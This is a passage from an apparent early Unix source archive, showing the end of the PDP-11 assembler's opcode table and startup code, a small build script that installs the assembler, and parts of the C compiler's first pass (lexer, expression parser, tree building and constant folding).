01;0000030 /getuid
01;0000031 /stime
01;0000034 /fstat
01;0000036 /mdate
01;0000037 /stty
01;0000040 /gtty
01;0000042 /nice
01;0000060 /signal

/ double operand

13;0010000 /mov
13;0110000 /movb
13;0020000 /cmp
13;0120000 /cmpb
13;0030000 /bit
13;0130000 /bitb
13;0040000 /bic
13;0140000 /bicb
13;0050000 /bis
13;0150000 /bisb
13;0060000 /add
13;0160000 /sub

/ branch

06;0000400 /br
06;0001000 /bne
06;0001400 /beq
06;0002000 /bge
06;0002400 /blt
06;0003000 /bgt
06;0003400 /ble
06;0100000 /bpl
06;0100400 /bmi
06;0101000 /bhi
06;0101400 /blos
06;0102000 /bvc
06;0102400 /bvs
06;0103000 /bhis
06;0103000 /bec
06;0103000 /bcc
06;0103400 /blo
06;0103400 /bcs
06;0103400 /bes

/ jump/ branch type

35;0000400 /jbr
36;0001000 /jne
36;0001400 /jeq
36;0002000 /jge
36;0002400 /jlt
36;0003000 /jgt
36;0003400 /jle
36;0100000 /jpl
36;0100400 /jmi
36;0101000 /jhi
36;0101400 /jlos
36;0102000 /jvc
36;0102400 /jvs
36;0103000 /jhis
36;0103000 /jec
36;0103000 /jcc
36;0103400 /jlo
36;0103400 /jcs
36;0103400 /jes

/ single operand

15;0005000 /clr
15;0105000 /clrb
15;0005100 /com
15;0105100 /comb
15;0005200 /inc
15;0105200 /incb
15;0005300 /dec
15;0105300 /decb
15;0005400 /neg
15;0105400 /negb
15;0005500 /adc
15;0105500 /adcb
15;0005600 /sbc
15;0105600 /sbcb
15;0005700 /tst
15;0105700 /tstb
15;0006000 /ror
15;0106000 /rorb
15;0006100 /rol
15;0106100 /rolb
15;0006200 /asr
15;0106200 /asrb
15;0006300 /asl
15;0106300 /aslb
15;0000100 /jmp
15;0000300 /swab

/ jsr

07;0004000 /jsr

/ rts

10;000200 /rts

/ simple operand

11;104400 /sys

/ flag-setting

01;0000241 /clc
01;0000242 /clv
01;0000244 /clz
01;0000250 /cln
01;0000261 /sec
01;0000262 /sev
01;0000264 /sez
01;0000270 /sen

/ floating point ops

01;170000 / cfcc
01;170001 / setf
01;170011 / setd
01;170002 / seti
01;170012 / setl
15;170400 / clrf
15;170700 / negf
15;170600 / absf
15;170500 / tstf
12;172400 / movf
14;177000 / movif
05;175400 / movfi
14;177400 / movof
05;176000 / movfo
14;172000 / addf
14;173000 / subf
14;171000 / mulf
14;174400 / divf
14;173400 / cmpf
14;171400 / modf
14;176400 / movie
05;175000 / movei
15;170100 / ldfps
15;170200 / stfps
24;000000 / fr0
24;000001 / fr1
24;000002 / fr2
24;000003 / fr3
24;000004 / fr4
24;000005 / fr5

/ 11/45 operations

30;072000 /als (ash)
30;073000 /alsc (ashc)
30;070000 /mpy
.if eae-1
30;070000/ mul
30;071000 / div
30;072000 / ash
30;073000 /ashc
.endif
30;071000 /dvd
07;074000 /xor
15;006700 /sxt
11;006400 /mark
31;077000 /sob

/ specials

16;000000 /.byte
20;000000 /.even
21;000000 /.if
22;000000 /.endif
23;000000 /.globl
25;000000 /.text
26;000000 /.data
27;000000 /.bss
32;000000 /.comm

start:
	cmp	(sp),$4
	bge	1f
	jmp	aexit
1:
	cmp	(sp)+,$5
	blt	1f
	mov	$40,defund		/ globalize all undefineds
1:
	tst	(sp)+
	mov	(sp)+,a.tmp1
	mov	(sp)+,a.tmp2
	mov	(sp)+,a.tmp3
	jsr	r5,ofile; a.tmp1
	movb	r0,txtfil
	jsr	r5,ofile; a.tmp2
	movb	r0,fbfil
	jsr	r5,ofile; a.tmp3
	movb	r0,symf
	movb	r0,fin
	sys	creat; a.out; 0
	bec	1f
	jsr	r5,filerr; a.outp
1:
	movb	r0,fout
	jmp	go

/ overlaid buffer
inbuf	= start
.	= inbuf+512.
-- /usr/source/as/run mode=0100664 uid=3 gid=3 atime=174922116 mtime=174917265 --
as as1?.s
ld -s -n a.out
cmp a.out /bin/as
cp a.out /bin/as
as as2?.s
ld -s -n a.out
cmp a.out /lib/as2
cp a.out /lib/as2
rm a.out
-- /usr/source/c mode=0140775 uid=3 gid=3 atime=174930097 mtime=174920699 --
-- /usr/source/c/c00.c mode=0110644 uid=10 gid=1 atime=174920379 mtime=174910919 --
#
/* C compiler
 *
 *
 *
 * Called from cc:
 *   c0 source temp1 temp2 [ profileflag ]
 * temp1 contains some ascii text and the binary expression
 * trees.  Each tree is introduced by the # character.
 * Strings are put on temp2, which cc tacks onto
 * temp1 for assembly.
 */

#include "c0h.c"

int	isn	1;
int	stflg	1;
int	peeksym	-1;
int	line	1;
int	debug	0;
int	dimp	0;
struct	tname	funcblk { NAME, 0, 0, REG, 0, 0 };
int	*treespace { osspace };

struct kwtab {
	char	*kwname;
	int	kwval;
} kwtab[]
{
	"int",		INT,
	"char",		CHAR,
	"float",	FLOAT,
	"double",	DOUBLE,
	"struct",	STRUCT,
	"long",		LONG,
	"auto",		AUTO,
	"extern",	EXTERN,
	"static",	STATIC,
	"register",	REG,
	"goto",		GOTO,
	"return",	RETURN,
	"if",		IF,
	"while",	WHILE,
	"else",		ELSE,
	"switch",	SWITCH,
	"case",		CASE,
	"break",	BREAK,
	"continue",	CONTIN,
	"do",		DO,
	"default",	DEFAULT,
	"for",		FOR,
	"sizeof",	SIZEOF,
	0,		0,
};

main(argc, argv)
char *argv[];
{
	extern fin;
	register char *sp;
	register i;
	register struct kwtab *ip;

	if(argc<3) {
		error("Arg count");
		exit(1);
	}
	if((fin=open(argv[1],0))<0) {
		error("Can't find %s", argv[1]);
		exit(1);
	}
	if (fcreat(argv[2], obuf)<0 || fcreat(argv[3], sbuf)<0) {
		error("Can't create temp");
		exit(1);
	}
	if (argc>4)
		proflg++;
	/*
	 * The hash table locations of the keywords
	 * are marked; if an identifier hashes to one of
	 * these locations, it is looked up in in the keyword
	 * table first.
	 */
	for (ip=kwtab; (sp = ip->kwname); ip++) {
		i = 0;
		while (*sp)
			i =+ *sp++;
		hshtab[i%hshsiz].hflag = FKEYW;
	}
	while(!eof) {
		extdef();
		blkend();
	}
	outcode("B", EOF);
	strflg++;
	outcode("B", EOF);
	fflush(obuf);
	fflush(sbuf);
	exit(nerror!=0);
}

/*
 * Look up the identifier in symbuf in the symbol table.
 * If it hashes to the same spot as a keyword, try the keyword table
 * first.  An initial "." is ignored in the hash.
 * Return is a ptr to the symbol table entry.
 */
lookup()
{
	int ihash;
	register struct hshtab *rp;
	register char *sp, *np;

	ihash = 0;
	sp = symbuf;
	if (*sp=='.')
		sp++;
	while (sp<symbuf+ncps)
		ihash =+ *sp++;
	rp = &hshtab[ihash%hshsiz];
	if (rp->hflag&FKEYW)
		if (findkw())
			return(KEYW);
	while (*(np = rp->name)) {
		for (sp=symbuf; sp<symbuf+ncps;)
			if (*np++ != *sp++)
				goto no;
		csym = rp;
		return(NAME);
	no:
		if (++rp >= &hshtab[hshsiz])
			rp = hshtab;
	}
	if(++hshused >= hshsiz) {
		error("Symbol table overflow");
		exit(1);
	}
	rp->hclass = 0;
	rp->htype = 0;
	rp->hoffset = 0;
	rp->dimp = 0;
	rp->hflag =| xdflg;
	sp = symbuf;
	for (np=rp->name; sp<symbuf+ncps;)
		*np++ = *sp++;
	csym = rp;
	return(NAME);
}

/*
 * Search the keyword table.
 * Ignore initial "." to avoid member-of-structure
 * problems.
 */
findkw()
{
	register struct kwtab *kp;
	register char *p1, *p2;
	char *wp;

	wp = symbuf;
	if (*wp=='.')
		wp++;
	for (kp=kwtab; (p2 = kp->kwname); kp++) {
		p1 = wp;
		while (*p1 == *p2++)
			if (*p1++ == '\0') {
				cval = kp->kwval;
				return(1);
			}
	}
	return(0);
}


/*
 * Return the next symbol from the input.
 * peeksym is a pushed-back symbol, peekc is a pushed-back
 * character (after peeksym).
 * mosflg means that the next symbol, if an identifier,
 * is a member of structure or a structure tag, and it
 * gets a "." prepended to it to distinguish
 * it from other identifiers.
 */
symbol() {
	register c;
	register char *sp;

	if (peeksym>=0) {
		c = peeksym;
		peeksym = -1;
		if (c==NAME)
			mosflg = 0;
		return(c);
	}
	if (peekc) {
		c = peekc;
		peekc = 0;
	} else
		if (eof)
			return(EOF);
		else
			c = getchar();
loop:
	switch(ctab[c]) {

	case INSERT:		/* ignore newlines */
		inhdr = 1;
		c = getchar();
		goto loop;

	case NEWLN:
		if (!inhdr)
			line++;
		inhdr = 0;

	case SPACE:
		c = getchar();
		goto loop;

	case EOF:
		eof++;
		return(0);

	case PLUS:
		return(subseq(c,PLUS,INCBEF));

	case MINUS:
		return(subseq(c,subseq('>',MINUS,ARROW),DECBEF));

	case ASSIGN:
		if (subseq(' ',0,1)) return(ASSIGN);
		c = symbol();
		if (c>=PLUS && c<=EXOR) {
			if (spnextchar() != ' '
			 && (c==MINUS || c==AND || c==TIMES)) {
				error("Warning: assignment operator assumed");
				nerror--;
			}
			return(c+ASPLUS-PLUS);
		}
		if (c==ASSIGN)
			return(EQUAL);
		peeksym = c;
		return(ASSIGN);

	case LESS:
		if (subseq(c,0,1)) return(LSHIFT);
		return(subseq('=',LESS,LESSEQ));

	case GREAT:
		if (subseq(c,0,1)) return(RSHIFT);
		return(subseq('=',GREAT,GREATEQ));

	case EXCLA:
		return(subseq('=',EXCLA,NEQUAL));

	case DIVIDE:
		if (subseq('*',1,0))
			return(DIVIDE);
		while ((c = spnextchar()) != EOF) {
			peekc = 0;
			if (c=='*') {
				if (spnextchar() == '/') {
					peekc = 0;
					c = getchar();
					goto loop;
				}
			}
		}
		eof++;
			error("Nonterminated comment");
			return(0);

	case PERIOD:
	case DIGIT:
		peekc = c;
		if ((c=getnum(c=='0'?8:10)) == FCON)
			cval = isn++;
		return(c);

	case DQUOTE:
		return(getstr());

	case SQUOTE:
		return(getcc());

	case LETTER:
		sp = symbuf;
		if (mosflg) {
			*sp++ = '.';
			mosflg = 0;
		}
		while(ctab[c]==LETTER || ctab[c]==DIGIT) {
			if (sp<symbuf+ncps) *sp++ = c;
			c = getchar();
		}
		while(sp<symbuf+ncps)
			*sp++ = '\0';
		peekc = c;
		if ((c=lookup())==KEYW && cval==SIZEOF)
			c = SIZEOF;
		return(c);

	case AND:
		return(subseq('&', AND, LOGAND));

	case OR:
		return(subseq('|', OR, LOGOR));

	case UNKN:
		error("Unknown character");
		c = getchar();
		goto loop;

	}
	return(ctab[c]);
}

/*
 * If the next input character is c, return a and advance.
 * Otherwise push back the character and return a.
 */
subseq(c,a,b)
{
	if (spnextchar() != c)
		return(a);
	peekc = 0;
	return(b);
}

/*
 * Read a double-quoted string, placing it on the
 * string buffer.
 */
getstr()
{
	register int c;
	register char *sp;

	nchstr = 1;
	sp = savstr;
	while((c=mapch('"')) >= 0) {
		nchstr++;
		if (sp >= &savstr[STRSIZ]) {
			sp = savstr;
			error("String too long");
		}
		*sp++ = c;
	}
	strptr = sp;
	cval = isn++;
	return(STRING);
}

/*
 * Write out a string, either in-line
 * or in the string temp file labelled by
 * lab.
 */
putstr(lab)
{
	register char *sp;

	if (lab) {
		strflg++;
		outcode("BNB", LABEL, lab, BDATA);
	} else
		outcode("B", BDATA);
	for (sp = savstr; sp<strptr; )
		outcode("1N", *sp++ & 0377);
	outcode("100");
	strflg = 0;
}

/*
 * read a single-quoted character constant.
 * The routine is sensitive to the layout of
 * characters in a word.
 */
getcc()
{
	register int c, cc;
	register char *ccp;

	cval = 0;
	ccp = &cval;
	cc = 0;
	while((c=mapch('\'')) >= 0)
		if(cc++ < NCPW)
			*ccp++ = c;
	if(cc>NCPW)
		error("Long character constant");
	return(CON);
}

/*
 * Read a character in a string or character constant,
 * detecting the end of the string.
 * It implements the escape sequences.
 */
mapch(ac)
{
	register int a, c, n;
	static mpeek;

	c = ac;
	if (a = mpeek)
		mpeek = 0;
	else
		a = getchar();
loop:
	if (a==c)
		return(-1);
	switch(a) {

	case '\n':
	case '\0':
		error("Nonterminated string");
		peekc = a;
		return(-1);

	case '\\':
		switch (a=getchar()) {

		case 't':
			return('\t');

		case 'n':
			return('\n');

		case 'b':
			return('\b');

		case '0': case '1': case '2': case '3':
		case '4': case '5': case '6': case '7':
			n = 0;
			c = 0;
			while (++c<=3 && '0'<=a && a<='7') {
				n =<< 3;
				n =+ a-'0';
				a = getchar();
			}
			mpeek = a;
			return(n);

		case 'r':
			return('\r');

		case '\n':
			if (!inhdr)
				line++;
			inhdr = 0;
			a = getchar();
			goto loop;
		}
	}
	return(a);
}

/*
 * Read an expression and return a pointer to its tree.
 * It's the classical bottom-up, priority-driven scheme.
 * The initflg prevents the parse from going past
 * "," or ":" because those delimitesrs are special
 * in initializer (and some other) expressions.
 */
tree()
{
#define	SEOF	200
#define	SSIZE	20
	int *op, opst[SSIZE], *pp, prst[SSIZE];
	register int andflg, o;
	register struct hshtab *cs;
	int p, ps, os;

	space = treespace;
	op = opst;
	pp = prst;
	cp = cmst;
	*op = SEOF;
	*pp = 06;
	andflg = 0;

advanc:
	switch (o=symbol()) {

	case NAME:
		cs = csym;
		if (cs->hclass==0 && cs->htype==0)
			if(nextchar()=='(') {
				/* set function */
				cs->hclass = EXTERN;
				cs->htype = FUNC;
			} else if (initflg)
				cs->hclass = EXTERN;
			else {
				/* set label */
				cs->htype = ARRAY;
				if (cs->hoffset==0)
					cs->hoffset = isn++;
			}
		*cp++ = copname(cs);
		goto tand;

	case FCON:
		if (!initflg)
			outcode("BBNB1N1N1N1N0B", DATA,LABEL,
			    cval, WDATA, fcval, PROG);

	case CON:
	case SFCON:
		*cp++ = block(1,o,(o==CON?INT:DOUBLE),0,cval);
		goto tand;

	/* fake a static char array */
	case STRING:
		putstr(cval);
		*cp++ = block(3, NAME, ARRAY+CHAR,0,STATIC,0,cval);

tand:
		if(cp>=cmst+cmsiz) {
			error("Expression overflow");
			exit(1);
		}
		if (andflg)
			goto syntax;
		andflg = 1;
		goto advanc;

	case INCBEF:
	case DECBEF:
		if (andflg)
			o =+ 2;
		goto oponst;

	case COMPL:
	case EXCLA:
	case SIZEOF:
		if (andflg)
			goto syntax;
		goto oponst;

	case MINUS:
		if (!andflg)  {
			if ((peeksym=symbol())==FCON) {
				fcval = - fcval;
				goto advanc;
			}
			if (peeksym==SFCON) {
				fcval = - fcval;
				cval =^ 0100000;
				goto advanc;
			}
			o = NEG;
		}
		andflg = 0;
		goto oponst;

	case AND:
	case TIMES:
		if (andflg)
			andflg = 0; else
			if(o==AND)
				o = AMPER;
			else
				o = STAR;
		goto oponst;

	case LPARN:
		if (andflg) {
			o = symbol();
			if (o==RPARN)
				o = MCALL;
			else {
				peeksym = o;
				o = CALL;
				andflg = 0;
			}
		}
		goto oponst;

	case RBRACK:
	case RPARN:
		if (!andflg)
			goto syntax;
		goto oponst;

	case DOT:
	case ARROW:
		mosflg++;
		break;

	}
	/* binaries */
	if (!andflg)
		goto syntax;
	andflg = 0;

oponst:
	p = (opdope[o]>>9) & 077;
	if ((o==COMMA || o==COLON) && initflg)
		p = 05;
opon1:
	ps = *pp;
	if (p>ps || p==ps && (opdope[o]&RASSOC)!=0) {
		switch (o) {

		case INCAFT:
		case DECAFT:
			p = 37;
			break;
		case LPARN:
		case LBRACK:
		case CALL:
			p = 04;
		}
		if (op >= &opst[SSIZE-1]) {
			error("expression overflow");
			exit(1);
		}
		*++op = o;
		*++pp = p;
		goto advanc;
	}
	--pp;
	switch (os = *op--) {

	case SEOF:
		peeksym = o;
		build(0);		/* flush conversions */
		return(*--cp);

	case CALL:
		if (o!=RPARN)
			goto syntax;
		build(os);
		goto advanc;

	case MCALL:
		*cp++ = block(0,0,0,0);	/* 0 arg call */
		os = CALL;
		break;

	case INCBEF:
	case INCAFT:
	case DECBEF:
	case DECAFT:
		*cp++ = block(1, CON, INT, 0, 1);
		break;

	case LPARN:
		if (o!=RPARN)
			goto syntax;
		goto advanc;

	case LBRACK:
		if (o!=RBRACK)
			goto syntax;
		build(LBRACK);
		goto advanc;
	}
	build(os);
	goto opon1;

syntax:
	error("Expression syntax");
	errflush(o);
	return(0);
}

/*
 * Generate a tree node for a name.
 * All the relevant info from the symbol table is
 * copied out, including the name if it's an external.
 * This is because the symbol table is gone in the next
 * pass, so a ptr isn't sufficient.
 */
copname(acs)
struct hshtab *acs;
{
	register struct hshtab *cs;
	register struct tname *tp;
	register char *cp1;
	int i;
	char *cp2;

	cs = acs;
	tp = gblock(sizeof(*tp)/NCPW);
	tp->op = NAME;
	tp->type = cs->htype;
	tp->dimp = cs->hdimp;
	if ((tp->class = cs->hclass)==0)
		tp->class = STATIC;
	tp->offset = 0;
	tp->nloc = cs->hoffset;
	if (cs->hclass==EXTERN) {
		gblock((ncps-NCPW)/NCPW);
		cp1 = tp->nname;
		cp2 = cs->name;
		i = ncps;
		do {
			*cp1++ = *cp2++;
		} while (--i);
	}
	if (cs->hflag&FFIELD)
		tp->class = FMOS;
	return(tp);
}
-- /usr/source/c/c01.c mode=0110644 uid=10 gid=1 atime=174920400 mtime=174910927 --
#
/*
 * C compiler
 *
 *
 */

#include "c0h.c"

/*
 * Called from tree, this routine takes the top 1, 2, or 3
 * operands on the expression stack, makes a new node with
 * the operator op, and puts it on the stack.
 * Essentially all the work is in inserting
 * appropriate conversions.
 */
build(op) {
	register int t1;
	int t2, t3, t;
	struct tnode *p3, *disarray();
	register struct tnode *p1, *p2;
	int d, dope, leftc, cvn, pcvn;

	/*
	 * a[i] => *(a+i)
	 */
	if (op==LBRACK) {
		build(PLUS);
		op = STAR;
	}
	dope = opdope[op];
	if ((dope&BINARY)!=0) {
		p2 = chkfun(disarray(*--cp));
		t2 = p2->type;
	}
	p1 = *--cp;
	/*
	 * sizeof gets turned into a number here.
	 * Bug: sizeof(structure-member-array) is 2 because
	 * the array has been turned into a ptr already.
	 */
	if (op==SIZEOF) {
		t1 = length(p1);
		p1->op = CON;
		p1->type = INT;
		p1->dimp = 0;
		p1->value = t1;
		*cp++ = p1;
		return;
	}
	if (op!=AMPER) {
		p1 = disarray(p1);
		if (op!=CALL)
			p1 = chkfun(p1);
	}
	t1 = p1->type;
	pcvn = 0;
	t = INT;
	switch (op) {

	/* end of expression */
	case 0:
		*cp++ = p1;
		return;

	/* no-conversion operators */
	case QUEST:
		if (p2->op!=COLON)
			error("Illegal conditional");
		t = t2;

	case COMMA:
	case LOGAND:
	case LOGOR:
		*cp++ = block(2, op, t, 0, p1, p2);
		return;

	case CALL:
		if ((t1&XTYPE) != FUNC)
			error("Call of non-function");
		*cp++ = block(2,CALL,decref(t1),p1->dimp,p1,p2);
		return;

	case STAR:
		if (p1->op==AMPER ) {
			*cp++ = p1->tr1;
			return;
		}
		if ((t1&XTYPE) == FUNC)
			error("Illegal indirection");
		*cp++ = block(1,STAR,decref(t1),p1->dimp,p1);
		return;

	case AMPER:
		if (p1->op==STAR) {
			p1->tr1->dimp = p1->dimp;
			p1->tr1->type = incref(t1);
			*cp++ = p1->tr1;
			return;
		}
		if (p1->op==NAME) {
			*cp++ = block(1,op,incref(t1),p1->dimp,p1);
			return;
		}
		error("Illegal lvalue");
		break;

	/*
	 * a->b goes to (*a).b
	 */
	case ARROW:
		*cp++ = p1;
		chkw(p1, -1);
		p1->type = PTR+STRUCT;
		build(STAR);
		p1 = *--cp;

	/*
	 * In a.b, a fairly complicated process has to
	 * be used to make the left operand look
	 * as if it had the type of the second.
	 * Also, the offset in the structure has to be
	 * given a special type to prevent conversion.
	 */
	case DOT:
		if (p2->op!=NAME || (p2->class!=MOS && p2->class!=FMOS))
			error("Illegal structure ref");
		*cp++ = p1;
		t = t2;
		if ((t&XTYPE) == ARRAY) {
			t = decref(t);
			p2->ssp++;
		}
		setype(p1, t, p2->dimp);
		build(AMPER);
		*cp++ = block(1,CON,NOTYPE,0,p2->nloc);
		build(PLUS);
		if ((t2&XTYPE) != ARRAY)
			build(STAR);
		if (p2->class == FMOS)
			*cp++ = block(2, FSEL, t, 0, *--cp, p2->dimp);
		return;
	}
	if ((dope&LVALUE)!=0)
		chklval(p1);
	if ((dope&LWORD)!=0)
		chkw(p1, LONG);
	if ((dope&RWORD)!=0)
		chkw(p2, LONG);
	if ((dope&BINARY)==0) {
		if (op==ITOF)
			t1 = DOUBLE;
		else if (op==FTOI)
			t1 = INT;
		if (!fold(op, p1, 0))
			*cp++ = block(1,op,t1,p1->dimp,p1);
		return;
	}
	cvn = 0;
	if (t1==STRUCT || t2==STRUCT) {
		error("Unimplemented structure operation");
		t1 = t2 = INT;
	}
	if (t2==NOTYPE) {
		t = t1;
		p2->type = INT;	/* no int cv for struct */
		t2 = INT;
	} else
		cvn = cvtab[lintyp(t1)][lintyp(t2)];
	leftc = (cvn>>4)&017;
	cvn =& 017;
	t = leftc? t2:t1;
	if (dope&ASSGOP) {
		t = t1;
		if (op==ASSIGN && (cvn==ITP||cvn==PTI))
			cvn = leftc = 0;
		if (leftc)
			cvn = leftc;
		leftc = 0;
	} else if (op==COLON && t1>=PTR && t1==t2)
		cvn = 0;
	else if (dope&RELAT) {
		if (op>=LESSEQ && (t1>=PTR || t2>=PTR))
			op =+ LESSEQP-LESSEQ;
		if (cvn==PTI)
			cvn = 0;
	}
	if (cvn==PTI) {
		cvn = 0;
		if (op==MINUS) {
			t = INT;
			pcvn++;
		} else {
			if (t1!=t2 || t1!=(PTR+CHAR))
				cvn = XX;
		}
	}
	if (cvn) {
		t1 = plength(p1);
		t2 = plength(p2);
		if (cvn==XX || (cvn==PTI&&t1!=t2))
			error("Illegal conversion");
		else if (leftc)
			p1 = convert(p1, t, cvn, t2);
		else
			p2 = convert(p2, t, cvn, t1);
	}
	if (dope&RELAT)
		t = INT;
	if (fold(op, p1, p2)==0)
		*cp++ = block(2,op,t,(p1->dimp==0? p2:p1)->dimp,p1,p2);
	if (pcvn && t1!=(PTR+CHAR)) {
		p1 = *--cp;
		*cp++ = convert(p1, 0, PTI, plength(p1->tr1));
	}
}

/*
 * Generate the appropirate conversion operator.
 * For pointer <=> integer this is a multiplication
 * or division, otherwise a special operator.
 */
convert(p, t, cvn, len)
struct tnode *p;
{
	register int n;

	switch(cvn) {

	case PTI:
	case ITP:
		if (len==1)
			return(p);
		return(block(2, (cvn==PTI?DIVIDE:TIMES), t, 0, p,
			block(1, CON, 0, 0, len)));

	case ITF:
		n = ITOF;
		break;
	case FTI:
		n = FTOI;
		break;
	case ITL:
		n = ITOL;
		break;
	case LTI:
		n = LTOI;
		break;
	case FTL:
		n = FTOL;
		break;
	case LTF:
		n = LTOF;
		break;
	}
	return(block(1, n, t, 0, p));
}

/*
 * Traverse an expression tree, adjust things
 * so the types of things in it are consistent
 * with the view that its top node has
 * type at.
 * Used with structure references.
 */
setype(ap, at, adimptr)
struct tnode *ap;
{
	register struct tnode *p;
	register t, dimptr;

	p = ap;
	t = at;
	dimptr = adimptr;
	p->type = t;
	if (dimptr != -1)
		p->dimp = dimptr;
	switch(p->op) {

	case AMPER:
		setype(p->tr1, decref(t), dimptr);
		return;

	case STAR:
		setype(p->tr1, incref(t), dimptr);
		return;

	case PLUS:
	case MINUS:
		setype(p->tr1, t, dimptr);
	}
}

/*
 * A mention of a function name is turned into
 * a pointer to that function.
 */
chkfun(ap)
struct tnode *ap;
{
	register struct tnode *p;
	register int t;

	p = ap;
	if (((t = p->type)&XTYPE)==FUNC)
		return(block(1,AMPER,incref(t),p->dimp,p));
	return(p);
}

/*
 * A mention of an array is turned into
 * a pointer to the base of the array.
 */
struct tnode *disarray(ap)
struct tnode *ap;
{
	register int t;
	register struct tnode *p;

	p = ap;
	/* check array & not MOS */
	if (((t = p->type)&XTYPE)!=ARRAY || p->op==NAME&&p->class==MOS)
		return(p);
	p->ssp++;
	*cp++ = p;
	setype(p, decref(t), -1);
	build(AMPER);
	return(*--cp);
}

/*
 * make sure that p is a ptr to a node
 * with type int or char or 'okt.'
 * okt might be nonexistent or 'long'
 * (e.g. for <<).
 */
chkw(p, okt)
struct tnode *p;
{
	register int t;

	if ((t=p->type)>CHAR && t<PTR && t!=okt)
		error("Integer operand required");
	return;
}

/*
 *'linearize' a type for looking up in the
 * conversion table
 */
lintyp(t)
{
	switch(t) {

	case INT:
	case CHAR:
		return(0);

	case FLOAT:
	case DOUBLE:
		return(1);

	case LONG:
		return(2);

	default:
		return(3);
	}
}

/*
 * Report an error.
 */
error(s, p1, p2, p3, p4, p5, p6)
{
	nerror++;
	printf("%d: ", line);
	printf(s, p1, p2, p3, p4, p5, p6);
	printf("\n");
}

/*
 * Generate a node in an expression tree,
 * setting the operator, type, degree (unused in this pass)
 * and the operands.
 */
block(an, op, t, d, p1,p2,p3)
int *p1, *p2, *p3;
{
	register int *ap, *p, n;
	int *oldp;

	n = an+3;
	p = gblock(n);
	oldp = p;
	ap = &op;
	do {
		*p++ = *ap++;
	} while (--n);
	return(oldp);
}

/*
 * Assign an unitialized block for use in the
 * expression tree.
 */
gblock(n)
{
	register int *p;

	p = space;
	if ((space =+ n) >= &osspace[OSSIZ]) {
		error("Expression overflow");
		exit(1);
	}
	return(p);
}

/*
 * Check that a tree can be used as an lvalue.
 */
chklval(ap)
struct tnode *ap;
{
	register struct tnode *p;

	p = ap;
	if (p->op!=NAME && p->op!=STAR)
		error("Lvalue required");
}

/*
 * reduce some forms of `constant op constant'
 * to a constant.  More of this is done in the next pass
 * but this is used to allow constant expressions
 * to be used in switches and array bounds.
 */
fold(op, ap1, ap2)
struct tnode *ap1, *ap2;
{
	register struct tnode *p1;
	register int v1, v2;

	p1 = ap1;
	if (p1->op!=CON || (ap2!=0 && ap2->op!=CON))
		return(0);
	v1 = p1->value;
	v2 = ap2->value;
	switch (op) {

	case PLUS:
		v1 =+ v2;
		break;

	case MINUS:
		v1 =- v2;
		break;

	case TIMES:
		v1 =* v2;
		break;

	case DIVIDE:
		v1 =/ v2;
		break;

	case MOD:
		v1 =% v2;
		break;

	case AND:
		v1 =& v2;
		break;

	case OR:
		v1 =| v2;
		break;

	case EXOR:
		v1 =^ v2;
		break;

	case NEG:
		v1 = - v1;
		break;

	case COMPL:
		v1 = ~ v1;
		break;

	case LSHIFT:
		v1 =<< v2;
		break;

	case RSHIFT:
		v1 =>> v2;
		break;

	default:
		return(0);
	}
	p1->value = v1;
	*cp++ = p1;
	return(1);
}

/*
 * Compile an expression expected to have constant value,
 * for example an array bound or a case value.
 */
conexp()
{
	register struct tnode *t;

	initflg++;
	if (t = tree())
		if (t->op != CON)
			error("Constant required");
	initflg--;
	return(t->value);
}
-- /usr/source/c/c02.c mode=0110666 uid=10 gid=1 atime=174920419 mtime=174910924 --
#
/* C compiler
 *
 *
 */

#include "c0h.c"

/*
 * Process a single external definition
 */
extdef()
{
	register o, elsize;
	int type, sclass;
	register struct hshtab *ds;

	if(((o=symbol())==EOF) || o==SEMI)
		return;
	peeksym = o;
	type = INT;
	sclass = EXTERN;
	xdflg = FNDEL;
	if ((elsize = getkeywords(&sclass, &type)) == -1 && peeksym!=NAME)
		goto syntax;
	if (type==STRUCT)
		blkhed();
	do {
		defsym = 0;
		decl1(EXTERN, type, 0, elsize);
		if ((ds=defsym)==0)
			return;
		funcsym = ds;
		ds->hflag =| FNDEL;
		outcode("BS", SYMDEF, ds->name);
		xdflg = 0;
		if ((ds->type&XTYPE)==FUNC) {
			if ((peeksym=symbol())==LBRACE || peeksym==KEYW) {
				funcblk.type = decref(ds->type);
				cfunc(ds->name);
				return;
			}
		} else 
			cinit(ds);
	} while ((o=symbol())==COMMA);
	if (o==SEMI)
		return;
syntax:
	if (o==RBRACE) {
		error("Too many }'s");
		peeksym = 0;
		return;
	}
	error("External definition syntax");
	errflush(o);
	statement(0);
}

/*
 * Process a function definition.
 */
cfunc(cs)
char *cs;
{
	register savdimp;

	savdimp = dimp;
	outcode("BBS", PROG, RLABEL, cs);
	declist(ARG);
	regvar = 5;
	retlab = isn++;
	if ((peeksym = symbol()) != LBRACE)
		error("Compound statement required");
	statement(1);
	outcode("BNB", LABEL, retlab, RETRN);
	dimp = savdimp;
}

/*
 * Process the initializers for an external definition.
 */
cinit(ds)
struct hshtab *ds;
{
	register basetype, nel, ninit;
	int o, width, realwidth;

	nel = 1;
	basetype = ds->type;
	/*
	 * If it's an array, find the number of elements.
	 * "basetype" is the type of thing it's an array of.
	 */
	while ((basetype&XTYPE)==ARRAY) {
		if ((nel = dimtab[ds->ssp&0377])==0)
			nel = 1;
		basetype = decref(basetype);
	}
	realwidth = width = length(ds) / nel;
	/*
	 * Pretend a structure is kind of an array of integers.
	 * This is a kludge.
	 */
	if (basetype==STRUCT) {
		nel =* realwidth/2;
		width = 2;
	}
	if ((peeksym=symbol())==COMMA || peeksym==SEMI) {
		outcode("BSN",CSPACE,ds->name,(nel*width+ALIGN)&~ALIGN);
		return;
	}
	ninit = 0;
	outcode("BBS", DATA, NLABEL, ds->name);
	if ((o=symbol())==LBRACE) {
		do
			ninit = cinit1(ds, basetype, width, ninit, nel);
		while ((o=symbol())==COMMA);
		if (o!=RBRACE)
			peeksym = o;
	} else {
		peeksym = o;
		ninit = cinit1(ds, basetype, width, 0, nel);
	}
	/*
	 * Above we pretended that a structure was a bunch of integers.
	 * Readjust in accordance with reality.
	 * First round up partial initializations.
	 */
	if (basetype==STRUCT) {
		if (o = 2*ninit % realwidth)
			outcode("BN", SSPACE, realwidth-o);
		ninit = (2*ninit+realwidth-2) / realwidth;
		nel =/ realwidth/2;
	}
	/*
	 * If there are too few initializers, allocate
	 * more storage.
	 * If there are too many initializers, extend
	 * the declared size for benefit of "sizeof"
	 */
	if (ninit<nel)
		outcode("BN", SSPACE, (nel-ninit)*realwidth);
	else if (ninit>nel) {
		if ((ds->type&XTYPE)==ARRAY)
			dimtab[ds->ssp&0377] = ninit;
		nel = ninit;
	}
	/*
	 * If it's not an array, only one initializer is allowed.
	 */
	if (ninit>1 && (ds->type&XTYPE)!=ARRAY)
